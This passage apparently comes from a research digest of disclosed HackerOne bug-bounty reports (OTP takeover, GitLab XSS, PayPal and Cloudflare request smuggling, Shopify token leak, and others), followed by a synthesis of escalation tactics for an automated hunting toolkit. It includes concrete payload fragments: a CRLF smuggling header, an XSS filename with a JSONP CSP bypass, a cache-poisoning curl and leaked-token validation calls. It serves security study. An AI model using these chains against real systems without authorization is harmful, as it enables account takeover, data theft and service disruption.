FIRST SIGNAL: NOT STATED; the observable is the send-OTP body `{"number":"XXXXXXXXXX","isdCode":"+91","resId":"XXXXXXXXXX"}` to `POST /restaurant-onboard-diy/v2/send-auto-claim-otp` with Referer `/partner_with_us/ownership` — the client supplies both the destination phone **and** the resource id.
Chain: A request an OTP for **your own** restaurant to **your own** number → genuine `{"message":"OTP SENT","requestId":XXXXXXX}` → B `verify-auto-claim-otp` with `{"verificationCode":XXX,"requestId":"XXXXXXXX","resId":"<victim>"}` → C server maps attacker email as `Owner / Manager` of the victim restaurant.
Impact proof: the two request bodies + the mapping statement; no media, verify response not shown; team confirms takeover of an unclaimed restaurant. Precondition: attacker owns a restaurant page with phone mapped to email; only works on unclaimed listings.
Defense fail: OTP proves control of *a* phone, never bound to the `resId` at verification; `X-Zomato-Csrft` irrelevant.
Tags: OTP/verification binding, business-logic, IDOR-on-second-step.

**41. https://hackerone.com/reports/307239** · 2018-04-04 · Coinbase (fintech) · Critical · $10,000 — **body empty**
Only: mishandled "PayPal transaction states" allowed a withdrawal to be paid out "but not have the funds deducted from their account" = double payout. Steps, race/idempotency detail, amounts: NOT STATED. Mechanic not extractable beyond that.
Tags: business-logic, payment-state.

## F. Stored XSS reaching crit/high (only when chained)

**42. https://hackerone.com/reports/1212067** · 2021-10-18 · GitLab · Critical 9.6 · $16,000
FIRST SIGNAL: the design-link regex in `design.rb` — `valid_char = %r{[^/\s]} # any char that is not a forward slash or whitespace`, with the note "this allows for any other special characters (such as quotes) to be matched".
Chain: A upload a design whose filename carries a quote by sending `Content-Disposition: filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png` → design name `bbb"class="gfm"a='.png` (this **skips Workhorse/CarrierWave::SanitizedFile**) → B reference it in markdown inside an `<a>` whose text starts with `'`; `AbstractReferenceFilter` interpolates into `href="#{url}"` unescaped → attribute injection → C inject `data-reference-type="design"`, `data-design`, `data-issue`, HTML-encoded `data-original`; **ReferenceRedactor rebuilds the node as raw HTML** via `%(<a href="#{href}">#{content}</a>)` → arbitrary HTML → D CSP bypass with Google's JSONP: `q=alert(document.domain);//&callback=setTimeout`.
Impact proof: live PoC on gitlab.com `/vakzz-h1/design-xss/-/issues/3`, `xss.mp4`. API-token theft referenced (report 1122227) but not demonstrated.
Defense fail: `escape_once` applied to `title` but not `url`; whitespace/slash still blocked so he injected **bare attributes only** and let the redactor emit raw HTML; no filename validator on the design model.
Tags: XSS, sanitizer-bypass-by-alternate-upload-path, CSP bypass, 4-stage.

**43. https://hackerone.com/reports/488147** · 2019-08-07 · PayPal · High 8.7 · $18,900 — **body empty; PortSwigger write-up cited**
Mechanic: a "configuration in frontend, caching servers" let a smuggled request turn a page request into a **cached redirect**. Chain: A HTTP request smuggling at the front end → B poison the cache entry → C legitimate users of /signin get attacker content. Requests/headers/payloads NOT STATED.

**44. https://hackerone.com/reports/510152** · 2019-08-07 · PayPal · High 8.7 · $20,000 — **body empty**
Same class, and the signal is in the title: it is a **bypass of the fix for #488147**. Bypass mechanism NOT STATED. Pair #43/#44 is the clearest "re-test the patch" datapoint with a dollar figure on both sides.
Tags: request-smuggling, cache-poisoning, incomplete-fix.

**45. https://hackerone.com/reports/1478633** · 2022-05-16 · Cloudflare · Critical 10.0 · $6,000 (incl. report-quality bonus)
Stack: Ruleset/Edge Rules engine, Transform Rules dynamic header rewrite; Cloudflare Access in front of internal origins.
FIRST SIGNAL: the engine "allows the use of hexadecimal escape sequences in string manipulation functions such as `concat()`" (e.g. `\x0a\x0d`). What drew him there NOT STATED.
Chain: A rule value `concat("-", "\x0d\x0aTransfer-Encoding: chunked")` = CRLF injection into an outgoing header → B TE.CL desync toward the origin → C body `0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n` smuggles a second request → bypass Cloudflare Access, read internal origin content.
Defense fail: "a lack of output sanitation" on decoded CR/LF; origins trusted edge traffic — CF's own advice: "always verify the Authorization JWT token before processing requests". Fixed within hours.
Tags: CRLF, request-smuggling, auth-proxy bypass.

**46. https://hackerone.com/reports/1096609** · 2021-04-08 · Shopify · Medium 4.6 · $2,900
FIRST SIGNAL: the Host header's **port** reflected into the page — request `Host: themes.shopify.com:1337`, response `<link rel="canonical" href="https://themes.shopify.com:1337/">`; cites PortSwigger "web-cache-entanglement".
Chain: A unkeyed Host-port reflection → B loop the request to get it cached (`curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337"`) → C normal visitors get assets on a closed port = DoS.
Impact proof: two terminals, one poisoning, one clean `grep ":1337"` showing the poisoned canonical; screenshot `PoC-Host-Header-cache-poisoned-DoS.png`. Report does not explain why the `?g4mm4=` entry matched plain `/`.
Tags: cache-poisoning, host-header. **Same primitive as #43/#44; DoS-only impact = Medium $2.9k vs $18.9k/$20k with XSS on /signin.**

## G. Secret exposure (recon-class, top of the money list)

**47. https://hackerone.com/reports/1087489** · 2021-07-26 · Shopify · Critical 10.0 · **$50,000** (highest in the corpus)
FIRST SIGNAL: in a **public macOS Electron app** by a Shopify employee, `npx asar extract` on `app.asar` "found a `.env` file" — he first dismissed it as config, then noticed "the app never loaded it", "likely a leftover of the release building process", containing "a `GH_TOKEN` variable".
Chain: A extract bundle → read unused `.env` → B validate: `curl -H "Authorization: token $GH_TOKEN" https://api.github.com/user` → C `/user/orgs` lists Shopify; `/orgs/Shopify/repos` returns private repos with `"permissions": {"admin": false, "push": true, "pull": true}` → D read+write to all Shopify repos, "potentially permitting me to place backdoors".
Impact proof: SHA-512 of `README.md` in private `github.com/Shopify/shopify` at commit `cea9c273391d` (read proof without copying data); permissions output as write proof; **no push performed**.
Defense fail: nothing stopped a secret entering the release; token belonged to a member with push on all repos.
Tags: secret-leak, token-validation, minimal-proof-done-right.

**48. https://hackerone.com/reports/591813** · 2021-02-25 · Uber · Critical · $39,999.99 — **`no-content`**
Only: "A username and certificate was found" in a git repo → API access to Phabricator on code.uberinternal.com. Repo/file/discovery method and proof NOT STATED.
Tags: secret-leak, internal-app.

**49. https://hackerone.com/reports/838635** · 2020-08-06 · LINE / LY · Critical · $12,500 — **body empty**
Mechanic: Spring Boot Actuator `/heapdump` and `/env` publicly reachable ("Due to insufficient access control"); separately the shared auth library never expired/invalidated tokens → replay. Whether the reporter linked heapdump→token replay is explicitly uncertain ("after further investigation"). Bounty was reduced "due to not being able to retrieve specific data".
Tags: misconfiguration, Spring-Boot, token-replay. **Note the bounty logic: the finding was Critical, the payout was cut for missing data proof.**

**50. https://hackerone.com/reports/3113398** · 2025-08-15 · HackerOne · High 8.2 · $12,500 — **`no-content`**
Only: "external access to HackerOne's internal Confluence documentation through a support system misconfiguration"; "support system workflows could be leveraged to gain unauthorized access to internal resources"; impact incl. "ability to view and modify limited content". Steps NOT STATED. Not extractable.

## H. SQLi (one readable datapoint)

**51. https://hackerone.com/reports/383127** · 2018-07-27 · Valve (partner.steampowered.com) · Critical 9.9 · $25,000 — **body empty**
Mechanic: "An unvalidated parameter on an partner reporting page (report_xml.php)" — blind SQLi via `countryFilter[]` (array param), behind an **Akamai WAF** which he bypassed; technique withheld ("Wait for the write-up ;)"). Payloads and proof NOT STATED. Note the array-shaped parameter again (cf. #15).

---

# SYNTHESIS

## 1. First signals that most often precede crit/high

Ranked by how often they actually appear as the stated trigger in this set (and I state plainly: in ~28 of 51 the trigger is not stated, mostly because H1 bodies are `no-content` — that absence is itself a bias in the corpus, not evidence that there was no signal).

1. **The vendor's own prior fix, advisory, or an already-disclosed report.** Highest hit rate and highest payouts: GitLab #1679624 ($33,510) started from reading the CVE-2022-2884 patch and noticing "there is another spot"; PayPal #510152 ($20,000) is a bypass of the fix for #488147 ($18,900) — the same hunter paid twice for the same bug class; Shopify #300305 ($15,250) started from Shopify's public summary of #270981; Grammarly #534450 started from the hunter's **own rejected report** #532553 ("this is how cookies are supposed to work"); GitLab #1439593 compared the bulk-import pipeline to the project-import pipeline that already strips symlinks.
2. **A server-side feature that fetches or renders a URL/file you supply.** Nearly every SSRF/XXE/file-read crit in the set: Exchange *screenshot* renderer (#7), *PDF* renderer (#8), *sitemap URL* parsed by a Java XML processor (#12), *upload* function (#11), *project import* + CarrierWave `remote_attachment_url` (#10), *webhook* "Test request" (#9), *GitHub import* against an attacker-controlled `github_hostname` (#2). Rule of thumb from the data: the fetcher does not have to be HTTP-shaped — email render, PDF render, screenshot render, ExifTool, a tar extractor and the Redis wire protocol all served as the execution/exfil channel.
3. **A value in a response that has no business being there.** `runners_token` in a notes JSON whose own body says `"valid": false` (#36); private email in `username_or_email` of `SaveCollaboratorsMutation` (#31); reset token in the reset response (#22); private report fields in `context.subject` **of a 422 denial** (#29); `.env`/`GH_TOKEN` in a shipped app bundle (#47). Corollary used by two different hunters: **read the failure/denial response as carefully as the success response.**
4. **A client-supplied field that should be server-side.** `resId` + destination phone in the OTP request (#40); `user[email]` accepting an array (#15); `template`/`type`/`custom_attributes` in `project.json` (#37); `use_custom_template` + `group_with_project_templates_id` in permitted params (#35); `countryFilter[]` (#51).
5. **A normalization gap you can name before you test it.** trailing-space `entityId` (#16), IDN homograph host (#19), IPv4-mapped IPv6 `[::ffff:a9fe:a9fe]` (#9), `filename*=ASCII-8BIT''` to route around the upload sanitizer (#42), `\x0d\x0a` hex escapes in a rule engine (#45), `Metadata-Flavor`-free legacy metadata path `/v1beta1` (#7).
6. **Source/regex reading for permissive quantifiers and early returns.** `(?<file>.*?)` (#14), `valid_char = %r{[^/\s]}` (#42), `return unless project.group` (#35), `credentials.js` calling `next()` with no Authorization (#1), `mount_uploader` implying a `remote_*_url=` setter (#10).
7. **A flow/permission anomaly noticed with no payload at all.** "a staff member without Apps permission was able to access the Stocky app" (#28); "authenticate against one SSO instance, but have you get added to a completely separate one" (#16); an id that appears in a public share URL and in a delete request (#32).
8. **Reflections into non-HTML sinks.** `{{ '7'*7 }}` → notification email (#5); cookie value → `<img src>` **inside `<noscript>`** where the escaped copy next to it was not exploitable (#20); Host port → `<link rel="canonical">` (#46).

## 2. Most common Low→High escalation moves

- **Low primitive: "server fetches my URL" → High: cloud credentials.** Required extra knowledge, not extra scanning: legacy metadata endpoints, `kube-env`, and address encodings. The dividing line in this corpus is literally whether credentials were read: #7/#8 = $25,000; #9 = $2,500 for the same class stopped at `server: EC2ws`.
- **Low: HTML/attribute injection → High: SSRF or RCE, not XSS.** #8 injected an `<iframe>` into HTML that a **server-side** renderer loaded. Every injection should be asked "who parses this next, and where does it run".
- **Low: arbitrary file write → High: RCE via a known target file.** `--output=` → `authorized_keys` → SSH as `git` (#4).
- **Low: arbitrary file read → High: full compromise via the secrets file.** `/etc/passwd` first (cheap existence proof), then `secrets.yml` → `secret_key_base`, signing keys (#13).
- **Low: XSS → High: ATO, through a *second* endpoint.** #20's XSS was worthless alone; the `grauth`-returning `/cookies` endpoint on a sibling host turned it into session theft, and CSP was defeated by an allowlisted JSONP endpoint (`callback=setTimeout`) in #42.
- **Low: type/shape confusion on one parameter.** string→array (#15, #51), form→JSON (#15), object overriding `to_s`/`bytesize` (#2). Two Burp clicks produced a 10.0/$35,000.
- **Low: a verification step → High: skip it by replaying the request the UI gated.** POST `/oauth/authorize` directly (#17), OTP `requestId` not bound to the resource (#40), email confirmation raced inside a 1,100–2,500 ms window (#39).
- **Low: an id you can see → High: a destructive or cross-tenant action.** Public share URL id into `DeleteStorySnaps` (#32); report ids into `reference.json` (#29); gid enumeration in a Relay `node()` query (#30); repo name + SHA into compare/diff (#33).
- **Low: open redirect / wildcard `redirect_uri` → High: token exfil** by chaining the target's *own* redirectors (`next_url` → Referer-based `/logout`) (#18).
- **Low: request smuggling / CRLF → High: cached stored XSS on the login page, or bypass of the auth proxy** (#43, #44, #45). Compare #46: same primitive, DoS-only, Medium.
- **Low: admin-only boolean inside an import file → High: instance-wide persistence.** `"template":true` installed a service into every project created afterwards (#37).
- **Low: leaked credential → High: org-wide.** The escalation work is *validation and mapping*: `/user` → `/user/orgs` → `/orgs/<org>/repos` with the permissions object (#47).

## 3. Which classes dominate, which almost never reach crit/high

**Dominate (by both count and bounty here):** RCE/code injection and deserialization (#1–#6, incl. three of the four largest GitLab payouts); SSRF that reaches cloud metadata (#7, #8, #11, #12); path traversal / arbitrary file read (#13, #14); broken authorization on a sensitive object — IDOR, over-serialization, GraphQL node/mutation authz (#29–#36); ATO via password-reset/token/session handling (#15, #21–#23, #26); identity confusion in SAML/OAuth where the *RP* trusts a claim (#16, #17); privilege escalation through import/export and template features (#35, #37, #38); secret exposure (#47–#50 — note #47 at $50,000 and #48 at $39,999.99 are the two top payouts in the whole corpus and required **no exploitation at all**, only discovery plus careful validation); business-logic takeovers of a resource/listing/store (#39, #40, #41).

**Almost never reach crit/high on their own** (visible directly in the class lists I pulled): open redirect — 20-entry `TOPOAUTH` list has only 5 paid at all, and the "Open Redirect in OAuth Flow" entries are $0; clickjacking/double-clickjacking ($0, incl. 2025 reports); CSRF with no sensitive action; **web cache deception** — four Glassdoor reports, all $0, and the cache-deception entries overall cluster at $0–$800; cache poisoning limited to DoS (#46, Medium $2,900); consent-UI / scope-display defects (#27, Medium); an "authentication bypass" with no data read (#28, Medium); info disclosure with no identity or secret attached (#19, Medium 6.4 — the OAuth code leaked but was never exchanged). The pattern is sharp: **the class does not set the severity; what the hunter proved with it does.** PayPal paid $18,900 and $20,000 for cache poisoning; Shopify paid $2,900 for cache poisoning.

## 4. What the hunters did that a checklist/scanner-style agent would not

- **Multi-identity, multi-tenant setup before the first payload.** #35 (two accounts, a group, features set to "Only Project Members"), #38 (attacker1 + attacker2 + victim, Owner invite, **then delete attacker2's account**), #39 (partner account + store + employee invite), #40 (you must own a restaurant with phone mapped to email first), #17 (seed the victim on a third-party RP via GitHub login *before* touching GitLab). None of this is reachable by probing a URL.
- **Tolerating time.** 30 minutes for the mirror sync (#38), ~2 minutes for SAML propagation (#16), a 1,100–2,500 ms race window held open across two browser tabs (#39). A five-minute-per-vector loop would discard three Criticals here.
- **Reading the defender's artifacts: patches, advisories, other people's disclosed reports, and one's own rejected reports.** #2, #43/#44, #39, #20. This is the single highest-yield behaviour in the corpus and it costs zero requests.
- **Library/framework internals rather than app behaviour.** CarrierWave's `mount_uploader` → `remote_attachment_url=` (#10); sift's `$where` + `CSP_ENABLED` (#1); redis-rb's framing trust in `to_s`/`bytesize` plus Sawyer's key-override (#2); ExifTool's content sniffing and DjVu `eval` (#3); Relay global-id format (#30); git's option parsing (#4).
- **Finding parameters that are absent from live traffic** by reading permitted-params and export formats (#35, #37) — a traffic-replay or param-fuzz agent never sees `group_with_project_templates_id` or `"template":false`.
- **Treating the denial/error path as the target.** #29 (422 that still serialized the object), #8 (the lookup-miss branch skipped sanitization), #36 (`"valid": false` with the token in the same body).
- **Asking which component parses the bytes next.** Extension allowlist vs content sniffing (#3); the sanitizer bypassed by sending the upload through a different path, `filename*=` (#42); HTML that a PDF engine will fetch (#8).
- **Impact proof as a deliberate, bounded act.** `id`/`hostname -a`/`ps auxww` output (#3), `uid=0(root)` (#7), `uid=998(git)` (#4), a **SHA-512 of a private README instead of its contents** (#47), the H1 test-report "flags" (#29), `server: EC2ws` (#9), a byte-level grep of the poisoned canonical from a second clean request (#46), `secrets.yml` keys truncated (#13). Two programs explicitly rewarded restraint and punished its absence: HackerOne praised "stopping at the right point in testing" (#8); LINE **reduced** the bounty "due to not being able to retrieve specific data" (#49).
- **Honest scoping of what was not shown** — "Slack mutation not confirmed" (#37), "maybe not necessary I didn't test" (#39), "I'm not sure if it's possible to get this with zero user interaction" (#16), "I think it can be a Remote Code Execution ... but there is a length limit" (#5). None of these cost the report its severity; all of them are the primitive-vs-impact distinction stated out loud.
- **Chaining across two hosts or two trust zones**: `gnar.grammarly.com` → `www.grammarly.com` (#20); `auth.uber.com` → `login.uber.com` → attacker (#18); Cloudflare edge → origin behind Access (#45); GitLab-as-IdP → laravelshift.com (#17). The impact lived in the *relationship*, not on either host.

**Two notes relevant to an LLM-driven toolkit:** (a) the two most recent Criticals I read — HackerOne #3862641 ($15,000) and Mozilla #3782701 ($12,000) — both carry `submitted_with_assistant: true`, and both were won by **source/flow reasoning plus a disciplined proof**, not by payload breadth; (b) the corpus's own highest payouts (#47 $50,000, #48 $39,999.99) were discovery + credential validation + minimal proof, which is exactly the work a scanner-shaped agent skips as "just info disclosure".
